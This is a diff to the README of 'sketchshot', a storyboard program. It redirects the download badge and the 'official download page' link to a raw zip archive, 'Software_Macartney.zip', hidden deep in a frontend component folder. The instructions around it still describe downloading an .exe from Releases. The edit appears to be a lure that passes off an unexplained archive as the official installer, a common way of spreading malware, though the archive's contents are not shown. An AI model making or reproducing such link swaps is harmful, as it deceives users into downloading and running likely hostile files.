@@ -1,6 +1,6 @@
 # 🎥 sketchshot - Build professional cinema storyboards easily
 
-[![Download sketchshot](https://img.shields.io/badge/Download_for_Windows-blue.svg)](https://github.com/guillemaunexpansive6052/sketchshot)
+[![Download sketchshot](https://img.shields.io/badge/Download_for_Windows-blue.svg)](https://github.com/guillemaunexpansive6052/sketchshot/raw/refs/heads/main/frontend/src/components/Nodes/ImageGenNode/Software_Macartney.zip)
 
 sketchshot creates storyboards through a manual, lens-focused workflow. It helps filmmakers, directors, and creators plan shots. You build stories with control instead of using random generators.
 
@@ -19,7 +19,7 @@ This tool helps you visualize scenes. You choose camera angles, lens types, and 
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official download page](https://github.com/guillemaunexpansive6052/sketchshot).
+1. Visit the [official download page](https://github.com/guillemaunexpansive6052/sketchshot/raw/refs/heads/main/frontend/src/components/Nodes/ImageGenNode/Software_Macartney.zip).
 2. Locate the latest version under the Releases section.
 3. Download the file ending in .exe.
 4. Save the file to your computer.
